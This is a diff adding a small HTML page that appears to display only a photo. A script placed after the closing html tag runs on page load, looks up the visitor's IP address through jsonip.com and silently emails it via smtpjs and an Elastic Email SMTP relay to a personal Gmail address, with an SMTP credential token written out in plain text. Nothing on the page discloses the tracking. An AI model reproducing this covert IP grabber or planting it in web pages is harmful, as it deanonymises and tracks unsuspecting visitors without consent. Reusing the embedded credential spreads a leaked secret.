@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.js"></script>
+    <script src="https://smtpjs.com/v2/smtp.js"></script>
+    <title>Title</title>
+</head>
+<body>
+<img src="10435841_10206264110858896_2744092953006045198_n.jpg">
+</body>
+</html>
+
+<script type="text/javascript">
+
+        $.getJSON("https://jsonip.com?callback=?", function(data) {
+
+            var ipadress = data.ip;
+            console.log(ipadress);
+            Email.send("test@test.com",
+                "ca.eyuboglu@gmail.com",
+                "İpadress",
+                "Testİp "+ipadress,
+                "smtp.elasticemail.com",
+                "ca.eyuboglu@gmail.com",
+                "4fa5de25-f43f-4016-a8fa-19198480eaf3");
+        });
+
+</script>
